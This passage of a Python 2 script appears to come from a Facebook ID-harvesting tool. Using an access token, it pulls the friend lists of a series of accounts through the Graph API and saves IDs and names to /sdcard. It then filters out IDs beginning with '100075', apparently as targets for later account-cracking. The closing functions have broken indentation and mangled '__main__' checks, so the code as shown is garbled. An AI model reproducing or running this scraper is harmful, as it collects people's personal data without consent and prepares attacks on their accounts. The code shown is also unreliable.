        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy14, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy15, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy16, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy17, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy18, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy19, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy20, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)            

    ys.close()
    jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved' % (N, H, N))
    print ' [%s\xe2\x80\xa2%s] Done Copy This File >  ( %s%s%s )' % (O, N, M, knt, N)
    print 50 * '-'
    raw_input(' [%s ENTER%s ] ' % (O, N))
    moch_yayan()
except (KeyError, IOError):
    os.remove(knt)
    jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
    raw_input(' [ %sBack%s ] ' % (O, N))
    moch_yayan()
def publik4(kontol):
filePath = '/sdcard/mjt_75.txt';
if os.path.exists(filePath):
os.remove(filePath)
ids = '/sdcard/ids_friends.txt'
os.system('cat /sdcard/ids_friends.txt | grep "100075" >> /sdcard/mjt_75.txt')
time.sleep(2)
print ' [\033[1;37;40m\x1b[0m] \tGetting 100075 ids Wait While.....\x1b[0m'
time.sleep(5)
print ' [\033[1;37;40m\x1b[0m] \t100075 ids saved in /sdcard/mjt_75.txt\x1b[0m'
time.sleep(5)
moch_yayan()

if name == 'main':
os.system('git pull')
moch_yayan()